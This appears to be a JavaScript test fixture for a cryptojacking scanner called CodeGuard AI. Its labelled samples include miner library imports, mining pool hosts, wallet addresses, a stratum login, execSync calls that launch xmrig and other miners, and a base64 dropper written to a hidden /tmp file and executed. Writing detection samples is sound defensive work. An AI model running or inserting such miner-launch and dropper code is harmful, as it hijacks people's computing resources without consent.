// ⚠️ TEST FILE — CodeGuard AI v8.0 Cryptojacking Scanner
// Every pattern below should trigger a CG_CRYPTO_* finding.
// Open in Windsurf with CodeGuard installed — expect 12+ diagnostics.

// ── In-browser miner library imports (CG_CRYPTO_001) ─────────────────────────
const miner = require('coinhive');
const cryptonight = require('cryptonight-wasm');
const jsMiner = require('jsecoin');
const coinImp = require('coinIMP');
const webMiner = require('webminerpool');
const cryptoLoot = require('crypto-loot');

// ── Mining pool hostnames (CG_CRYPTO_010) ─────────────────────────────────────
const POOL_URL = 'stratum+tcp://pool.minexmr.com:4444';
const POOL_XMR = 'xmr.f2pool.com';
const POOL_ETH = 'eth.nanopool.org';
const POOL_BTC = 'stratum.slushpool.com';
const POOL_NICEHASH = 'stratum+tcp://nicehash.eu:3355';
const POOL_NANOPOOL = 'xmr-eu1.nanopool.org:14444';

// ── Stratum protocol URL (CG_CRYPTO_011) ─────────────────────────────────────
function startMining() {
    const socket = new WebSocket('stratum+tcp://monero.crypto-pool.fr:3333');
    socket.send(JSON.stringify({
        method: 'login',
        params: {
            login: MONERO_WALLET,
            pass: 'x',
            algo: 'randomx'             // mining algorithm flag
        }
    }));
}

// ── Wallet addresses (CG_CRYPTO_012) ──────────────────────────────────────────
// Monero wallet (95-char format)
const MONERO_WALLET = '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A';

// Ethereum wallet
const ETH_WALLET = '0xde0B295669a9FD93d5F28D9Ec85E40f4cb697BAe';

// Bitcoin wallet
const BTC_WALLET = '1A1zP1eP5QGefi2DMPTfTL5SLmv7Divf Na';

// ── Miner binaries (CG_CRYPTO_020) ────────────────────────────────────────────
const { execSync } = require('child_process');

// These lines reference known miner executable names
execSync('./xmrig --algo randomx --url pool.minexmr.com:4444 --user ' + MONERO_WALLET);
execSync('minerd -a sha256d -o stratum+tcp://stratum.slushpool.com:3333');
execSync('./ethminer -G -F http://eth.nanopool.org/' + ETH_WALLET);
execSync('ccminer --algo=kawpow --url=stratum+tcp://rvn.2miners.com:6060');

// ── Mining algorithm flags in code (CG_CRYPTO_021) ────────────────────────────
const miningConfig = {
    algo: 'randomx',                    // XMR algorithm
    coin: 'kawpow',                     // RVN algorithm
    threads: require('os').cpus().length,
    pools: [
        { url: POOL_URL, user: MONERO_WALLET, pass: 'x' },
        { url: 'stratum+tcp://xmr.crypto-pool.fr:3333', user: MONERO_WALLET }
    ]
};

// ── Base64-encoded dropper (CG_CRYPTO_030) ────────────────────────────────────
// This is a base64-encoded string starting with MZ (PE header) — miner dropper
const DROPPER_PAYLOAD = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUu';

function dropMiner() {
    const buf = Buffer.from(DROPPER_PAYLOAD, 'base64');
    require('fs').writeFileSync('/tmp/.xmrig', buf);
    execSync('chmod +x /tmp/.xmrig && /tmp/.xmrig');
}

// ── postinstall script escalation (highest severity) ─────────────────────────
// If the above patterns appear inside package.json "scripts.postinstall",
// CodeGuard auto-escalates severity to CRITICAL.
// See: test-samples/package.json → scripts.postinstall
